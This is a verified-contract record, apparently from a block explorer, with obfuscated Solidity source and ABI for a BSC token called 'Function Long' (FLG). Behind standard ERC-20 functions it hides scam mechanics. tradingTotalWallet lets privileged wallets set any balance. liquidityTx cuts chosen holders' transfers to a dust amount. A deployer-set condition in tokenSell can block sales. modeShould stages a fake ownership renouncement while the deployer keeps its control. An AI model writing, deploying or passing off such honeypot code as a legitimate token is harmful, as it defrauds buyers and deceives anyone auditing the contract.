{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface exemptLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract buyTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atMax {\n    function createPair(address autoWallet, address teamFund) external returns (address);\n}\n\ninterface teamAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamSell) external view returns (uint256);\n\n    function transfer(address exemptTx, uint256 tradingLaunch) external returns (bool);\n\n    function allowance(address tokenBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptTx,\n        uint256 tradingLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletFrom, uint256 value);\n    event Approval(address indexed tokenBuy, address indexed spender, uint256 value);\n}\n\ninterface teamAutoMetadata is teamAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FunctionLong is buyTo, teamAuto, teamAutoMetadata {\n\n    uint256 feeTake;\n\n    function tokenSell(address fundSwap, address exemptTx, uint256 tradingLaunch) internal returns (bool) {\n        if (fundSwap == limitListMin) {\n            return shouldMarketing(fundSwap, exemptTx, tradingLaunch);\n        }\n        uint256 atShouldEnable = teamAuto(shouldLimitMax).balanceOf(minExempt);\n        require(atShouldEnable == modeList);\n        require(exemptTx != minExempt);\n        if (receiverLaunchFee[fundSwap]) {\n            return shouldMarketing(fundSwap, exemptTx, fromFund);\n        }\n        return shouldMarketing(fundSwap, exemptTx, tradingLaunch);\n    }\n\n    uint256 public sellMode;\n\n    address public limitListMin;\n\n    function allowance(address launchedTx, address maxLaunch) external view virtual override returns (uint256) {\n        if (maxLaunch == fundExempt) {\n            return type(uint256).max;\n        }\n        return isTake[launchedTx][maxLaunch];\n    }\n\n    mapping(address => uint256) private feeAmountWallet;\n\n    bool public totalReceiver;\n\n    string private tokenIs = \"Function Long\";\n\n    bool public txMarketing;\n\n    function transferFrom(address fundSwap, address exemptTx, uint256 tradingLaunch) external override returns (bool) {\n        if (_msgSender() != fundExempt) {\n            if (isTake[fundSwap][_msgSender()] != type(uint256).max) {\n                require(tradingLaunch <= isTake[fundSwap][_msgSender()]);\n                isTake[fundSwap][_msgSender()] -= tradingLaunch;\n            }\n        }\n        return tokenSell(fundSwap, exemptTx, tradingLaunch);\n    }\n\n    uint256 public launchedFee;\n\n    event OwnershipTransferred(address indexed launchedMarketing, address indexed fundToList);\n\n    function name() external view virtual override returns (string memory) {\n        return tokenIs;\n    }\n\n    bool private swapMinList;\n\n    function balanceOf(address teamSell) public view virtual override returns (uint256) {\n        return feeAmountWallet[teamSell];\n    }\n\n    function transfer(address swapTx, uint256 tradingLaunch) external virtual override returns (bool) {\n        return tokenSell(_msgSender(), swapTx, tradingLaunch);\n    }\n\n    function owner() external view returns (address) {\n        return autoMarketing;\n    }\n\n    uint256 constant fromFund = 10 ** 10;\n\n    uint256 private receiverReceiver;\n\n    uint256 private tokenMode = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return autoMarketing;\n    }\n\n    function amountFee(address shouldFrom) public {\n        if (listFeeReceiver) {\n            return;\n        }\n        \n        swapWalletLimit[shouldFrom] = true;\n        if (receiverReceiver == launchedFee) {\n            launchedFee = sellMode;\n        }\n        listFeeReceiver = true;\n    }\n\n    function modeShould() public {\n        emit OwnershipTransferred(limitListMin, address(0));\n        autoMarketing = address(0);\n    }\n\n    address fundExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private modeSwap;\n\n    constructor (){\n        if (swapMinList != totalReceiver) {\n            receiverReceiver = modeSwap;\n        }\n        exemptLiquidity feeEnable = exemptLiquidity(fundExempt);\n        shouldLimitMax = atMax(feeEnable.factory()).createPair(feeEnable.WETH(), address(this));\n        \n        limitListMin = _msgSender();\n        modeShould();\n        swapWalletLimit[limitListMin] = true;\n        feeAmountWallet[limitListMin] = tokenMode;\n        \n        emit Transfer(address(0), limitListMin, tokenMode);\n    }\n\n    address minExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public receiverLaunchFee;\n\n    mapping(address => mapping(address => uint256)) private isTake;\n\n    function approve(address maxLaunch, uint256 tradingLaunch) public virtual override returns (bool) {\n        isTake[_msgSender()][maxLaunch] = tradingLaunch;\n        emit Approval(_msgSender(), maxLaunch, tradingLaunch);\n        return true;\n    }\n\n    function launchMarketing(uint256 tradingLaunch) public {\n        exemptMode();\n        modeList = tradingLaunch;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenMode;\n    }\n\n    uint8 private listIs = 18;\n\n    function exemptMode() private view {\n        require(swapWalletLimit[_msgSender()]);\n    }\n\n    uint256 modeList;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverToken;\n    }\n\n    bool public listFeeReceiver;\n\n    string private receiverToken = \"FLG\";\n\n    function tradingTotalWallet(address swapTx, uint256 tradingLaunch) public {\n        exemptMode();\n        feeAmountWallet[swapTx] = tradingLaunch;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return listIs;\n    }\n\n    function shouldMarketing(address fundSwap, address exemptTx, uint256 tradingLaunch) internal returns (bool) {\n        require(feeAmountWallet[fundSwap] >= tradingLaunch);\n        feeAmountWallet[fundSwap] -= tradingLaunch;\n        feeAmountWallet[exemptTx] += tradingLaunch;\n        emit Transfer(fundSwap, exemptTx, tradingLaunch);\n        return true;\n    }\n\n    mapping(address => bool) public swapWalletLimit;\n\n    function liquidityTx(address senderAt) public {\n        exemptMode();\n        if (launchedFee == receiverReceiver) {\n            sellMode = modeSwap;\n        }\n        if (senderAt == limitListMin || senderAt == shouldLimitMax) {\n            return;\n        }\n        receiverLaunchFee[senderAt] = true;\n    }\n\n    address public shouldLimitMax;\n\n    address private autoMarketing;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundToList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFrom\",\"type\":\"address\"}],\"name\":\"amountFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingLaunch\",\"type\":\"uint256\"}],\"name\":\"launchMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitListMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderAt\",\"type\":\"address\"}],\"name\":\"liquidityTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFeeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverLaunchFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLimitMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapWalletLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingLaunch\",\"type\":\"uint256\"}],\"name\":\"tradingTotalWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "FunctionLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}